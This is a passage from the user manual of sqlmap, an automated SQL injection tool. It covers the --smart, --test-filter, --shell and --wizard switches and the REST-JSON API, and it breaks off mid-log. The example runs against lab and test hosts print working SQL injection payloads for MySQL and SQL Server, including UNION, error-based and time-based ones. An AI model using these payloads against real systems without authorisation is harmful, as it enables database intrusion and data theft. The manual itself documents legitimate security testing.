/><br /><br /><h3>Safely remove all content from data directory</h3><br />Switch <code>--purge</code><br />In case that user decides to safely remove all content from sqlmap&#39;s data directory (e.g. <code>$HOME/.local/share/sqlmap</code>), containing all target details from previous sqlmap runs, he can use switch <code>--purge</code>.  While purging, all files from (sub)directories in data folder will be  overwritten with random data, truncated, renamed to random names,  (sub)directories will be renamed to random names too, and finally the  whole directory tree will be deleted.<br />Example run:<br /><code>$ python sqlmap.py --purge -v 3<br />[...]<br />[xx:xx:55] [INFO] purging content of directory &#39;/home/testuser/.local/share/sqlmap&#39;...<br />[xx:xx:55] [DEBUG] changing file attributes<br />[xx:xx:55] [DEBUG] writing random data to files<br />[xx:xx:55] [DEBUG] truncating files<br />[xx:xx:55] [DEBUG] renaming filenames to random values<br />[xx:xx:55] [DEBUG] renaming directory names to random values<br />[xx:xx:55] [DEBUG] deleting the whole directory tree<br />[...]<br /></code><br /><br /><br /><br /><h3>Conduct thorough tests only if positive heuristic(s)</h3><br />Switch <code>--smart</code><br />There are cases when user has a large list of potential target URLs (e.g. provided with option <code>-m</code>) and he wants to find a vulnerable target as fast as possible. If switch <code>--smart</code> is used, only parameters with which DBMS error(s) can be provoked, are being used further in scans. Otherwise they are skipped.<br />Example against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;use\<br />r=foo&amp;id=1&quot; --batch --smart<br />[...]<br />[xx:xx:14] [INFO] testing if GET parameter &#39;ca&#39; is dynamic<br />[xx:xx:14] [WARNING] GET parameter &#39;ca&#39; does not appear dynamic<br />[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter &#39;ca&#39; might <br />not be injectable<br />[xx:xx:14] [INFO] skipping GET parameter &#39;ca&#39;<br />[xx:xx:14] [INFO] testing if GET parameter &#39;user&#39; is dynamic<br />[xx:xx:14] [WARNING] GET parameter &#39;user&#39; does not appear dynamic<br />[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter &#39;user&#39; migh<br />t not be injectable<br />[xx:xx:14] [INFO] skipping GET parameter &#39;user&#39;<br />[xx:xx:14] [INFO] testing if GET parameter &#39;id&#39; is dynamic<br />[xx:xx:14] [INFO] confirming that GET parameter &#39;id&#39; is dynamic<br />[xx:xx:14] [INFO] GET parameter &#39;id&#39; is dynamic<br />[xx:xx:14] [WARNING] reflective value(s) found and filtering out<br />[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter &#39;id&#39; might be <br />injectable (possible DBMS: &#39;MySQL&#39;)<br />[xx:xx:14] [INFO] testing for SQL injection on GET parameter &#39;id&#39;<br />heuristic (parsing) test showed that the back-end DBMS could be &#39;MySQL&#39;. Do you <br />want to skip test payloads specific for other DBMSes? [Y/n] Y<br />do you want to include all tests for &#39;MySQL&#39; extending provided level (1) and ri<br />sk (1)? [Y/n] Y<br />[xx:xx:14] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;<br />[xx:xx:14] [INFO] GET parameter &#39;id&#39; is &#39;AND boolean-based blind - WHERE or HAVI<br />NG clause&#39; injectable <br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause<br />&#39;<br />[xx:xx:14] [INFO] GET parameter &#39;id&#39; is &#39;MySQL &gt;= 5.0 AND error-based - WHERE or<br /> HAVING clause&#39; injectable <br />[xx:xx:14] [INFO] testing &#39;MySQL inline queries&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt; 5.0.11 stacked queries&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &lt; 5.0.12 stacked queries (heavy query)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt; 5.0.11 AND time-based blind&#39;<br />[xx:xx:24] [INFO] GET parameter &#39;id&#39; is &#39;MySQL &gt; 5.0.11 AND time-based blind&#39; in<br />jectable <br />[xx:xx:24] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;<br />[xx:xx:24] [INFO] automatically extending ranges for UNION query injection techn<br />ique tests as there is at least one other potential injection technique found<br />[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the <br />time needed to find the right number of query columns. Automatically extending t<br />he range for current UNION query injection technique test<br />[xx:xx:24] [INFO] target URL appears to have 3 columns in query<br />[xx:xx:24] [INFO] GET parameter &#39;id&#39; is &#39;MySQL UNION query (NULL) - 1 to 20 colu<br />mns&#39; injectable<br />[...]<br /></code><br /><br /><br /><br /><h3>Select (or skip) tests by payloads and/or titles</h3><br />Option <code>--test-filter</code><br />In case that you want to filter tests by their payloads and/or titles  you can use this option. For example, if you want to test all payloads  which have <code>ROW</code> keyword inside, you can use <code>--test-filter=ROW</code>.<br />Example against a MySQL target:<br /><code>$ python sqlmap.py -u &quot;http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot; --b\<br />atch --test-filter=ROW<br />[...]<br />[xx:xx:39] [INFO] GET parameter &#39;id&#39; is dynamic<br />[xx:xx:39] [WARNING] reflective value(s) found and filtering out<br />[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter &#39;id&#39; might be <br />injectable (possible DBMS: &#39;MySQL&#39;)<br />[xx:xx:39] [INFO] testing for SQL injection on GET parameter &#39;id&#39;<br />[xx:xx:39] [INFO] testing &#39;MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause<br />&#39;<br />[xx:xx:39] [INFO] GET parameter &#39;id&#39; is &#39;MySQL &gt;= 4.1 AND error-based - WHERE or<br /> HAVING clause&#39; injectable <br />GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any<br />)? [y/N] N<br />sqlmap identified the following injection points with a total of 3 HTTP(s) reque<br />sts:<br />---<br />Place: GET<br />Parameter: id<br />    Type: error-based<br />    Title: MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause<br />    Payload: id=1 AND ROW(4959,4971)&gt;(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELEC<br />T (C<br />    ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FRO<br />M (S<br />    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY <br />x)<br />---<br />[...]<br /></code><br />Option <code>--test-skip=TEST</code><br />In case that you want to skip tests by their payloads and/or titles  you can use this option. For example, if you want to skip all payloads  which have <code>BENCHMARK</code> keyword inside, you can use <code>--test-skip=BENCHMARK</code>.<br /><br /><br /><br /><h3>Interactive sqlmap shell</h3><br />Switch: <code>--shell</code><br />By using switch <code>--shell</code> user will be presented with the  interactive sqlmap shell which has the history of all previous runs with  used options and/or switches:<br /><code>$ python sqlmap.py --shell<br />sqlmap &gt; -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot; --technique=\<br />BEU --batch<br />         _<br /> ___ ___| |_____ ___ ___  {1.0-dev-2188502}<br />|_ -| . | |     | .&#39;| . |<br />|___|_  |_|_|_|_|__,|  _|<br />      |_|           |_|   http://sqlmap.org<br /><br />[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual<br /> consent is illegal. It is the end user&#39;s responsibility to obey all applicable <br />local, state and federal laws. Developers assume no liability and are not respon<br />sible for any misuse or damage caused by this program<br /><br />[*] starting at xx:xx:11<br /><br />[xx:xx:11] [INFO] testing connection to the target URL<br />[xx:xx:12] [INFO] testing if the target URL is stable<br />[xx:xx:13] [INFO] target URL is stable<br />[xx:xx:13] [INFO] testing if GET parameter &#39;artist&#39; is dynamic<br />[xx:xx:13] [INFO] confirming that GET parameter &#39;artist&#39; is dynamic<br />[xx:xx:13] [INFO] GET parameter &#39;artist&#39; is dynamic<br />[xx:xx:13] [INFO] heuristic (basic) test shows that GET parameter &#39;artist&#39; might<br /> be injectable (possible DBMS: &#39;MySQL&#39;)<br />[xx:xx:13] [INFO] testing for SQL injection on GET parameter &#39;artist&#39;<br />it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads sp<br />ecific for other DBMSes? [Y/n] Y<br />for the remaining tests, do you want to include all tests for &#39;MySQL&#39; extending <br />provided level (1) and risk (1) values? [Y/n] Y<br />[xx:xx:13] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;<br />[xx:xx:13] [INFO] GET parameter &#39;artist&#39; seems to be &#39;AND boolean-based blind - <br />WHERE or HAVING clause&#39; injectable <br />[xx:xx:13] [INFO] testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER B<br />Y or GROUP BY clause&#39;<br />[xx:xx:13] [INFO] testing &#39;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY<br /> or GROUP BY clause&#39;<br />[xx:xx:13] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER B<br />Y or GROUP BY clause (EXTRACTVALUE)&#39;<br />[xx:xx:13] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY<br /> or GROUP BY clause (EXTRACTVALUE)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER B<br />Y or GROUP BY clause (UPDATEXML)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY<br /> or GROUP BY clause (UPDATEXML)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER B<br />Y or GROUP BY clause (EXP)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE, HAVING clause (E<br />XP)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER B<br />Y or GROUP BY clause (BIGINT UNSIGNED)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE, HAVING clause (B<br />IGINT UNSIGNED)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER B<br />Y or GROUP BY clause&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 4.1 OR error-based - WHERE, HAVING clause&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACT<br />VALUE)&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.0 error-based - Parameter replace&#39;<br />[xx:xx:14] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACT<br />VALUE)&#39;<br />[xx:xx:15] [INFO] testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEX<br />ML)&#39;<br />[xx:xx:15] [INFO] testing &#39;MySQL &gt;= 5.5 error-based - Parameter replace (EXP)&#39;<br />[xx:xx:15] [INFO] testing &#39;MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT <br />UNSIGNED)&#39;<br />[xx:xx:15] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 20 columns&#39;<br />[xx:xx:15] [INFO] automatically extending ranges for UNION query injection techn<br />ique tests as there is at least one other (potential) technique found<br />[xx:xx:15] [INFO] ORDER BY technique seems to be usable. This should reduce the <br />time needed to find the right number of query columns. Automatically extending t<br />he range for current UNION query injection technique test<br />[xx:xx:15] [INFO] target URL appears to have 3 columns in query<br />[xx:xx:16] [INFO] GET parameter &#39;artist&#39; is &#39;Generic UNION query (NULL) - 1 to 2<br />0 columns&#39; injectable<br />GET parameter &#39;artist&#39; is vulnerable. Do you want to keep testing the others (if<br /> any)? [y/N] N<br />sqlmap identified the following injection point(s) with a total of 39 HTTP(s) re<br />quests:<br />---<br />Parameter: artist (GET)<br />    Type: boolean-based blind<br />    Title: AND boolean-based blind - WHERE or HAVING clause<br />    Payload: artist=1 AND 5707=5707<br /><br />    Type: UNION query<br />    Title: Generic UNION query (NULL) - 3 columns<br />    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764<br />26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),<br />NULL,NULL-- -<br />---<br />[xx:xx:16] [INFO] testing MySQL<br />[xx:xx:16] [INFO] confirming MySQL<br />[xx:xx:16] [INFO] the back-end DBMS is MySQL<br />web application technology: Nginx, PHP 5.3.10<br />back-end DBMS: MySQL &gt;= 5.0.0<br />[xx:xx:16] [INFO] fetched data logged to text files under &#39;/home/stamparm/.sqlma<br />p/output/testphp.vulnweb.com&#39;<br />sqlmap-shell&gt; -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot; --banner<br />         _<br /> ___ ___| |_____ ___ ___  {1.0-dev-2188502}<br />|_ -| . | |     | .&#39;| . |<br />|___|_  |_|_|_|_|__,|  _|<br />      |_|           |_|   http://sqlmap.org<br /><br />[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual<br /> consent is illegal. It is the end user&#39;s responsibility to obey all applicable <br />local, state and federal laws. Developers assume no liability and are not respon<br />sible for any misuse or damage caused by this program<br /><br />[*] starting at xx:xx:25<br /><br />[xx:xx:26] [INFO] resuming back-end DBMS &#39;mysql&#39; <br />[xx:xx:26] [INFO] testing connection to the target URL<br />sqlmap resumed the following injection point(s) from stored session:<br />---<br />Parameter: artist (GET)<br />    Type: boolean-based blind<br />    Title: AND boolean-based blind - WHERE or HAVING clause<br />    Payload: artist=1 AND 5707=5707<br /><br />    Type: UNION query<br />    Title: Generic UNION query (NULL) - 3 columns<br />    Payload: artist=-7983 UNION ALL SELECT CONCAT(0x716b706271,0x6f6c506a7473764<br />26d58446f634454616a4c647a6c6a69566e584e454c64666f6861466e697a5069,0x716a786a71),<br />NULL,NULL-- -<br />---<br />[xx:xx:26] [INFO] the back-end DBMS is MySQL<br />[xx:xx:26] [INFO] fetching banner<br />web application technology: Nginx, PHP 5.3.10<br />back-end DBMS operating system: Linux Ubuntu<br />back-end DBMS: MySQL 5<br />banner:    &#39;5.1.73-0ubuntu0.10.04.1&#39;<br />[xx:xx:26] [INFO] fetched data logged to text files under &#39;/home/stamparm/.sqlma<br />p/output/testphp.vulnweb.com&#39; <br />sqlmap-shell&gt; exit<br /></code><br /><br /><br /><br /><h3>Simple wizard interface for beginner users</h3><br />Switch: <code>--wizard</code><br />For beginner users there is a wizard interface which uses a simple  workflow with as little questions as possible. If user just enters  target URL and uses default answers (e.g. by pressing <code>Enter</code>) he should have a properly set sqlmap run environment by the end of the workflow.<br />Example against a Microsoft SQL Server target:<br /><code>$ python sqlmap.py --wizard<br /><br />    sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool<br />    http://sqlmap.org<br /><br />[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual<br /> consent is illegal. It is the end user&#39;s responsibility to obey all applicable <br />local, state and federal laws. Developers assume no liability and are not respon<br />sible for any misuse or damage caused by this program<br /><br />[*] starting at xx:xx:26<br /><br />Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_in<br />t.asp?id=1<br />POST data (--data) [Enter for None]: <br />Injection difficulty (--level/--risk). Please choose:<br />[1] Normal (default)<br />[2] Medium<br />[3] Hard<br />&gt; 1<br />Enumeration (--banner/--current-user/etc). Please choose:<br />[1] Basic (default)<br />[2] Smart<br />[3] All<br />&gt; 1<br /><br />sqlmap is running, please wait..<br /><br />heuristic (parsing) test showed that the back-end DBMS could be &#39;Microsoft SQL S<br />erver&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y<br />do you want to include all tests for &#39;Microsoft SQL Server&#39; extending provided l<br />evel (1) and risk (1)? [Y/n] Y<br />GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any<br />)? [y/N] N<br />sqlmap identified the following injection points with a total of 25 HTTP(s) requ<br />ests:<br />---<br />Place: GET<br />Parameter: id<br />    Type: boolean-based blind<br />    Title: AND boolean-based blind - WHERE or HAVING clause<br />    Payload: id=1 AND 2986=2986<br /><br />    Type: error-based<br />    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause<br />    Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+C<br />HAR(58)+(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58<br />)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)))<br /><br />    Type: UNION query<br />    Title: Generic UNION query (NULL) - 3 columns<br />    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58)+CHAR(118)+CHAR(114)+CHAR(1<br />00)+CHAR(58)+CHAR(70)+CHAR(79)+CHAR(118)+CHAR(106)+CHAR(87)+CHAR(101)+CHAR(119)+<br />CHAR(115)+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)-- <br /><br />    Type: stacked queries<br />    Title: Microsoft SQL Server/Sybase stacked queries<br />    Payload: id=1; WAITFOR DELAY &#39;0:0:5&#39;--<br /><br />    Type: AND/OR time-based blind<br />    Title: Microsoft SQL Server/Sybase time-based blind<br />    Payload: id=1 WAITFOR DELAY &#39;0:0:5&#39;--<br /><br />    Type: inline query<br />    Title: Microsoft SQL Server/Sybase inline queries<br />    Payload: id=(SELECT CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(58)+(SELECT <br />(CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR<br />(109)+CHAR(113)+CHAR(58))<br />---<br />web server operating system: Windows XP<br />web application technology: ASP, Microsoft IIS 5.1<br />back-end DBMS operating system: Windows XP Service Pack 2<br />back-end DBMS: Microsoft SQL Server 2005<br />banner:<br />---<br />Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) <br />    Oct 14 2005 00:33:37 <br />    Copyright (c) 1988-2005 Microsoft Corporation<br />    Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)<br />---<br />current user:    &#39;sa&#39;<br />current database:    &#39;testdb&#39;<br />current user is DBA:    True<br /><br />[*] shutting down at xx:xx:52<br /></code><br /><br /><br /><br /><h2>API (REST-JSON)</h2><br />sqlmap can be run through the REST-JSON API, API (abbr. for  Application Program Interface) that uses JSON for REST (abbr. for  REpresentational State Transfer) communication between server and client  instance(s). In plainspeak, server runs the sqlmap scan(s), while  clients are setting the sqlmap options/switches and pull the results  back. Main program file for running the API is <code>sqlmapapi.py</code>, while the client can also be implemented inside the arbitrary user program.<br /><code>$ python sqlmapapi.py -hh<br />Usage: sqlmapapi.py [options]<br /><br />Options:<br />  -h, --help            show this help message and exit<br />  -s, --server          Act as a REST-JSON API server<br />  -c, --client          Act as a REST-JSON API client<br />  -H HOST, --host=HOST  Host of the REST-JSON API server (default &quot;127.0.0.1&quot;)<br />  -p PORT, --port=PORT  Port of the the REST-JSON API server (default 8775)<br />  --adapter=ADAPTER     Server (bottle) adapter to use (default &quot;wsgiref&quot;)<br /></code><br />Server runs the <code>sqlmapapi.py</code> by using switch <code>-s</code>, client by using switch <code>-c</code>, while in both cases user can (optionally) set listening IP address with option <code>-H</code> (default <code>&quot;127.0.0.1&quot;</code>) and listening port with option <code>-p</code> (default <code>8775</code>).  Each client&#39;s &quot;session&quot; can have multiple &quot;tasks&quot; (i.e. sqlmap scan  runs), where user can arbitrary choose which task should be currently  active.<br />Inside the client&#39;s command line interface available commands are:<br />◇ <code>help</code> - showing list of available commands along with basic help information<br />◇ <code>new ARGS</code> - starts a new scan task with provided arguments (e.g. <code>new -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot;</code>)<br />◇ <code>use TASKID</code> - switches current context to different task (e.g. <code>use c04d8c5c7582efb4</code>)<br />◇ <code>data</code> - retrieves and shows data for current task<br />◇ <code>log</code>- retrieves and shows log for current task<br />◇ <code>status</code> - retrieves and shows status for current task<br />◇ <code>stop</code> - stops current task<br />◇ <code>kill</code> - kills current task<br />◇ <code>list</code> - displays all tasks (for current session)<br />◇ <code>flush</code> - flushes (i.e. deletes) all tasks<br />◇ <code>exit</code> - exits the client interface<br /><br />Example server run:<br /><code>$ python sqlmapapi.py -s -H &quot;0.0.0.0&quot;<br />[12:47:51] [INFO] Running REST-JSON API server at &#39;0.0.0.0:8775&#39;..<br />[12:47:51] [INFO] Admin ID: 89fd118997840a9bd7fc329ab535b881<br />[12:47:51] [DEBUG] IPC database: /tmp/sqlmapipc-SzBQnd<br />[12:47:51] [DEBUG] REST-JSON API server connected to IPC database<br />[12:47:51] [DEBUG] Using adapter &#39;wsgiref&#39; to run bottle<br />[12:48:10] [DEBUG] Created new task: &#39;a42ddaef02e976f0&#39;<br />[12:48:10] [DEBUG] [a42ddaef02e976f0] Started scan<br />[12:48:16] [DEBUG] [a42ddaef02e976f0] Retrieved scan status<br />[12:48:50] [DEBUG] [a42ddaef02e976f0] Retrieved scan status<br />[12:48:55] [DEBUG] [a42ddaef02e976f0] Retrieved scan log messages<br />[12:48:59] [DEBUG] [a42ddaef02e976f0] Retrieved scan data and error messages<br /></code><br />Example client run:<br /><code>$ python sqlmapapi.py -c -H &quot;192.168.110.1&quot;<br />[12:47:53] [DEBUG] Example client access from command line:<br />    $ taskid=$(curl http://192.168.110.1:8775/task/new 2&gt;1 | grep -o -I &#39;[a-f0-9<br />]\{16\}&#39;) &amp;&amp; echo $taskid<br />    $ curl -H &quot;Content-Type: application/json&quot; -X POST -d &#39;{&quot;url&quot;: &quot;http://testp<br />hp.vulnweb.com/artists.php?artist=1&quot;}&#39; http://192.168.110.1:8775/scan/$taskid/st<br />art<br />    $ curl http://192.168.110.1:8775/scan/$taskid/data<br />    $ curl http://192.168.110.1:8775/scan/$taskid/log<br />[12:47:53] [INFO] Starting REST-JSON API client to &#39;http://192.168.110.1:8775&#39;..<br />.<br />[12:47:53] [DEBUG] Calling http://192.168.110.1:8775<br />[12:47:53] [INFO] Type &#39;help&#39; or &#39;?&#39; for list of available commands<br />api&gt; ?<br />help        Show this help message<br />new ARGS    Start a new scan task with provided arguments (e.g. &#39;new -u &quot;http://<br />testphp.vulnweb.com/artists.php?artist=1&quot;&#39;)<br />use TASKID  Switch current context to different task (e.g. &#39;use c04d8c5c7582efb4<br />&#39;)<br />data        Retrieve and show data for current task<br />log         Retrieve and show log for current task<br />status      Retrieve and show status for current task<br />stop        Stop current task<br />kill        Kill current task<br />list        Display all tasks<br />flush       Flush tasks (delete all tasks)<br />exit        Exit this client<br />api&gt; new -u &quot;http://testphp.vulnweb.com/artists.php?artist=1&quot; --banner --flush-s<br />ession<br />[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/task/new<br />[12:48:10] [INFO] New task ID is &#39;a42ddaef02e976f0&#39;<br />[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/start<br />[12:48:10] [INFO] Scanning started<br />api (a42ddaef02e976f0)&gt; status<br />[12:48:16] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu<br />s<br />{<br />    &quot;status&quot;: &quot;running&quot;, <br />    &quot;returncode&quot;: null, <br />    &quot;success&quot;: true<br />}<br />api (a42ddaef02e976f0)&gt; status<br />[12:48:50] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu<br />s<br />{<br />    &quot;status&quot;: &quot;terminated&quot;, <br />    &quot;returncode&quot;: 0, <br />    &quot;success&quot;: true<br />}<br />api (a42ddaef02e976f0)&gt; log<br />[12:48:55] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/log<br />{<br />    &quot;log&quot;: [<br />        {<br />            &quot;message&quot;: &quot;flushing session file&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:10&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing connection to the target URL&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:10&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;checking if the target is protected by some kind of WAF/<br />IPS&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:10&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing if the target URL is stable&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:10&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;target URL is stable&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:11&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing if GET parameter &#39;artist&#39; is dynamic&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:11&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;confirming that GET parameter &#39;artist&#39; is dynamic&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:11&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;GET parameter &#39;artist&#39; is dynamic&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:11&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;heuristic (basic) test shows that GET parameter &#39;artist&#39;<br /> might be injectable (possible DBMS: &#39;MySQL&#39;)&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:11&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing for SQL injection on GET parameter &#39;artist&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:11&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;AND boolean-based blind - WHERE or HAVING claus<br />e&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:11&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;GET parameter &#39;artist&#39; appears to be &#39;AND boolean-based <br />blind - WHERE or HAVING clause&#39; injectable (with --string=\&quot;hac\&quot;)&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, O<br />RDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE, HAVING cla<br />use (BIGINT UNSIGNED)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, O<br />RDER BY or GROUP BY clause (EXP)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.5 OR error-based - WHERE, HAVING cla<br />use (EXP)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING,<br /> ORDER BY or GROUP BY clause (JSON_KEYS)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.7.8 OR error-based - WHERE, HAVING c<br />lause (JSON_KEYS)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, O<br />RDER BY or GROUP BY clause (FLOOR)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, OR<br />DER BY or GROUP BY clause (FLOOR)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, O<br />RDER BY or GROUP BY clause (EXTRACTVALUE)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, OR<br />DER BY or GROUP BY clause (EXTRACTVALUE)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, O<br />RDER BY or GROUP BY clause (UPDATEXML)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            